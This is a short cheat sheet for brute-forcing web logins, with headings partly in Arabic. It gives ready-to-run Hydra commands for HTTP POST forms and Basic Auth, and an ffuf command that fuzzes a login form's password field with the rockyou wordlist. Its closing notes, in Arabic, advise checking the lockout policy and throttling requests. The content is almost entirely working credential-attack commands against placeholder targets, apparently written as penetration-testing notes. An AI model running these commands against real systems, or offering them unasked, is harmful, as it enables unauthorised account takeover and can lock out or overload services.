# Login Brute Forcing

## HTTP POST form (Hydra)
```bash
hydra -l admin -P rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## HTTP Basic Auth
```bash
hydra -l admin -P rockyou.txt <IP> http-get /admin/
```

## ffuf على نموذج تسجيل الدخول
```bash
ffuf -w rockyou.txt:FUZZ -u http://<host>/login.php \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200 -mc 302
```

## ملاحظات
- راقب lockout policy قبل ما تطلق brute force كامل
- جرب rate limiting / delay (`-t`, `-p`) عشان متتسببش في DoS
